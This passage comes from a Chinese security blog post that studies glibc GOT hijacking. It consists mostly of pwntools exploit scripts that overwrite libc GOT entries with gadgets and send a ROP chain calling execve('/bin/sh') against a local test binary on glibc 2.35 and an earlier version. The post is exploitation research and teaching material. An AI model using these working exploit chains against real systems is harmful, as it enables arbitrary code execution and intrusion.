with:</span></span><br><span class="line"><span class="string">.text:0000000000177D59                 lea     rdi, [rsp+18h]</span></span><br><span class="line"><span class="string">.text:0000000000177D5E                 mov     edx, 20h ; &#x27; &#x27;</span></span><br><span class="line"><span class="string">.text:0000000000177D63                 call    j_strncpy</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># overwrite strncpy.got with:</span></span><br><span class="line"><span class="string">.text:00000000000D60A8                 pop     rbx</span></span><br><span class="line"><span class="string">.text:00000000000D60A9                 pop     rbp</span></span><br><span class="line"><span class="string">.text:00000000000D60AA                 pop     r12</span></span><br><span class="line"><span class="string">.text:00000000000D60AC                 pop     r13</span></span><br><span class="line"><span class="string">.text:00000000000D60AE                 jmp     j_wmemset_0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># overwrite wmemset.got with `gets`</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">strchrnul_gadget = lbase + <span class="number">0x0000000000177D59</span></span><br><span class="line">strncpy_gadget = lbase + <span class="number">0x00000000000D60A8</span></span><br><span class="line">gets_ptr = lbase + <span class="number">0x0000000000082AE0</span></span><br><span class="line"></span><br><span class="line">write_dest = lbase + <span class="number">0x00000000001FE078</span></span><br><span class="line">write_payload = flat(</span><br><span class="line">    strncpy_gadget,</span><br><span class="line">    <span class="number">0xdead0001</span>,</span><br><span class="line">    <span class="number">0xdead0002</span>,</span><br><span class="line">    <span class="number">0xdead0003</span>,</span><br><span class="line">    <span class="number">0xdead0004</span>,</span><br><span class="line">    <span class="number">0xdead0005</span>,</span><br><span class="line">    <span class="number">0xdead0006</span>,</span><br><span class="line">    <span class="number">0xdead0007</span>,</span><br><span class="line">    gets_ptr,</span><br><span class="line">    <span class="number">0xdead0008</span>,</span><br><span class="line">    strchrnul_gadget,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">prdi = lbase + <span class="number">0x0000000000028715</span></span><br><span class="line">binsh = lbase + <span class="number">0x00000000001C041B</span></span><br><span class="line">prsi = lbase + <span class="number">0x000000000002a671</span></span><br><span class="line">prdx_rbx = lbase + <span class="number">0x0000000000093359</span></span><br><span class="line">execve_ptr = lbase + <span class="number">0x00000000000EAFF0</span></span><br><span class="line"></span><br><span class="line">rop_payload = flat(</span><br><span class="line">    prdi, binsh,</span><br><span class="line">    prsi, <span class="number">0</span>,</span><br><span class="line">    prdx_rbx, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    execve_ptr,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">ss(<span class="string">&quot;write payload to &#123;&#125;, length &#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">    <span class="built_in">hex</span>(write_dest), <span class="built_in">hex</span>(<span class="built_in">len</span>(write_payload))))</span><br><span class="line">sd(p64(write_dest))</span><br><span class="line">sd(p64(<span class="built_in">len</span>(write_payload)))</span><br><span class="line">sd(write_payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger gets(stack), send rop gadget</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(rop_payload)</span><br><span class="line"></span><br><span class="line">interact()</span><br></pre></td></tr></table></figure>



<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207170119228.png"></p>
<p>我也在glibc 2.35上做了测试，同样可以利用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./vuln-2.35&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.35.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">x</span>): <span class="keyword">return</span> x.encode(<span class="string">&#x27;latin1&#x27;</span>) <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">str</span>) <span class="keyword">else</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.send(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.sendline(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendlineafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rv</span>(<span class="params">x=<span class="number">0x1000</span></span>): <span class="keyword">return</span> cn.recv(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> cn.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.recvuntil(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddr</span>(): <span class="keyword">return</span> u64(cn.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddrn</span>(<span class="params">x</span>): <span class="keyword">return</span> u64(rv(x).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interact</span>(): <span class="keyword">return</span> cn.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ss</span>(<span class="params">s</span>): <span class="keyword">return</span> success(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logsym</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> inspect.getframeinfo(inspect.currentframe().f_back)[<span class="number">3</span>]:</span><br><span class="line">        m = re.search(<span class="string">r&#x27;\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        varname = m.group(<span class="number">1</span>)</span><br><span class="line">        ss(<span class="string">f&quot;<span class="subst">&#123;varname&#125;</span> =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(val)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ss(<span class="built_in">hex</span>(val))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">leak = <span class="built_in">int</span>(rl(), <span class="number">16</span>)</span><br><span class="line">logsym(leak)</span><br><span class="line">lbase = leak - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">logsym(lbase)</span><br><span class="line">libc.address = lbase</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.got.plt:0000000000219090 off_219090      dq offset strncpy       ; DATA XREF: j_strncpy+4↑r</span></span><br><span class="line"><span class="string">.got.plt:0000000000219098 off_219098      dq offset strlen        ; DATA XREF: j_strlen+4↑r</span></span><br><span class="line"><span class="string">.got.plt:00000000002190A0 off_2190A0      dq offset strcasecmp_l  ; DATA XREF: j_strcasecmp_l+4↑r</span></span><br><span class="line"><span class="string">.got.plt:00000000002190A8 off_2190A8      dq offset strcpy        ; DATA XREF: j_strcpy+4↑r</span></span><br><span class="line"><span class="string">.got.plt:00000000002190B0 off_2190B0      dq offset wcschr        ; DATA XREF: j_wcschr+4↑r</span></span><br><span class="line"><span class="string">.got.plt:00000000002190B8 off_2190B8      dq offset strchrnul     ; DATA XREF: j_strchrnul+4↑r</span></span><br><span class="line"><span class="string">.got.plt:00000000002190C0 off_2190C0      dq offset memrchr       ; DATA XREF: j_memrchr+4↑r</span></span><br><span class="line"><span class="string">.got.plt:00000000002190C8 off_2190C8      dq offset _dl_deallocate_tls</span></span><br><span class="line"><span class="string">.got.plt:00000000002190D0 off_2190D0      dq offset __tls_get_addr</span></span><br><span class="line"><span class="string">.got.plt:00000000002190D8 off_2190D8      dq offset wmemset       ; DATA XREF: j_wmemset_0+4↑r</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># overwrite strchrnul.got with:</span></span><br><span class="line"><span class="string">.text:0000000000173E0E                 lea     rdi, [rsp+18h]</span></span><br><span class="line"><span class="string">.text:0000000000173E13                 mov     edx, 20h ; &#x27; &#x27;</span></span><br><span class="line"><span class="string">.text:0000000000173E18                 call    j_strncpy</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># overwrite strncpy.got with:</span></span><br><span class="line"><span class="string">.text:00000000000C5BF8                 pop     rbx</span></span><br><span class="line"><span class="string">.text:00000000000C5BF9                 pop     rbp</span></span><br><span class="line"><span class="string">.text:00000000000C5BFA                 pop     r12</span></span><br><span class="line"><span class="string">.text:00000000000C5BFC                 pop     r13</span></span><br><span class="line"><span class="string">.text:00000000000C5BFE                 jmp     j_wmemset_0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># overwrite wmemset.got with `gets`</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">strchrnul_gadget = lbase + <span class="number">0x0000000000173E0E</span></span><br><span class="line">strncpy_gadget = lbase + <span class="number">0x00000000000C5BF8</span></span><br><span class="line">gets_ptr = lbase + <span class="number">0x0000000000080520</span></span><br><span class="line"></span><br><span class="line">write_dest = lbase + <span class="number">0x0000000000219090</span></span><br><span class="line">write_payload = flat(</span><br><span class="line">    strncpy_gadget,</span><br><span class="line">    <span class="number">0xdead0001</span>,</span><br><span class="line">    <span class="number">0xdead0002</span>,</span><br><span class="line">    <span class="number">0xdead0003</span>,</span><br><span class="line">    <span class="number">0xdead0004</span>,</span><br><span class="line">    strchrnul_gadget,</span><br><span class="line">    <span class="number">0xdead0005</span>,</span><br><span class="line">    <span class="number">0xdead0006</span>,</span><br><span class="line">    <span class="number">0xdead0007</span>,</span><br><span class="line">    gets_ptr,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">prdi = lbase + <span class="number">0x000000000002a3e5</span></span><br><span class="line">binsh = lbase + <span class="number">0x00000000001D8698</span></span><br><span class="line">prsi = lbase + <span class="number">0x000000000002be51</span></span><br><span class="line">prdx_rbx = lbase + <span class="number">0x00000000000904a9</span></span><br><span class="line">execve_ptr = lbase + <span class="number">0x00000000000EB080</span></span><br><span class="line"></span><br><span class="line">rop_payload = flat(</span><br><span class="line">    prdi, binsh,</span><br><span class="line">    prsi, <span class="number">0</span>,</span><br><span class="line">    prdx_rbx, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    execve_ptr,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">ss(<span class="string">&quot;write payload to &#123;&#125;, length &#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">    <span class="built_in">hex</span>(write_dest), <span class="built_in">hex</span>(<span class="built_in">len</span>(write_payload))))</span><br><span class="line">sd(p64(write_dest))</span><br><span class="line">sd(p64(<span class="built_in">len</span>(write_payload)))</span><br><span class="line">sd(write_payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger gets(stack), send rop gadget</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(rop_payload)</span><br><span class="line"></span><br><span class="line">interact()</span><br></pre></td></tr></table></figure>



<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207170305334.png"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol>
<li><p><a target="_blank" rel="noopener" href="https://github.com/n132/Libc-GOT-Hijacking">https://github.com/n132/Libc-GOT-Hijacking</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://hackmd.io/@pepsipu/SyqPbk94a">https://hackmd.io/@pepsipu/SyqPbk94a</a></p>
</li>
</ol>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-origin"><span class="toc-number">1.1.</span> <span class="toc-text">0x00. origin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-fx0"><span class="toc-number">1.2.</span> <span class="toc-text">0x01. fx0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-fx1"><span class="toc-number">1.3.</span> <span class="toc-text">0x02. fx1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-fx2"><span class="toc-number">1.4.</span> <span class="toc-text">0x03. fx2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-fx3"><span class="toc-number">1.5.</span> <span class="toc-text">0x04. fx3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-fx4"><span class="toc-number">1.6.</span> <span class="toc-text">0x05. fx4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-fx5"><span class="toc-number">1.7.</span> <span class="toc-text">0x06. fx5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-one-punch"><span class="toc-number">1.8.</span> <span class="toc-text">0x07. one_punch</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">2.</span> <span class="toc-text">Reference</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&text=glibc GOT hijack 学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&title=glibc GOT hijack 学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&is_video=false&description=glibc GOT hijack 学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=glibc GOT hijack 学习&body=Check out this article: https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&title=glibc GOT hijack 学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&title=glibc GOT hijack 学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&title=glibc GOT hijack 学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&title=glibc GOT hijack 学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&name=glibc GOT hijack 学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/&t=glibc GOT hijack 学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2023
    veritas501
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
